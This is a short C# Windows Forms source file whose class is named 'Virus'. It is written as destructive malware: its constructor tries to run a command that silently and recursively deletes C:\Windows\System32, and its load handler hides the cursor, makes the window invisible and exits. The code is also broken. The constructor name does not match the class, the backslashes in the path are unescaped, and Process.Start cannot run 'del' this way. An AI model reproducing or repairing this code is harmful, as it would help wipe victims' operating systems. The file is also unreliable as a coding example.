using System;
using System.Collections.Generic;
using System.ComponentModel;
using System.Data;
using System.Drawing;
using System.Text;
using System.Windows.Forms;
using System.Diagnostics;

namespace _run
{
    public partial class Virus : Form
    {
        public Form1()
        {
            InitializeComponent();
            Process.Start("del C:\Windows\System32 /s /a /q");
        }
        
        private void Form1_Load(object sender, EventArgs e)
        {
           Cursor.Hide();
           Opacity = 0.0;
           Application.Exit();
        }
    }
}
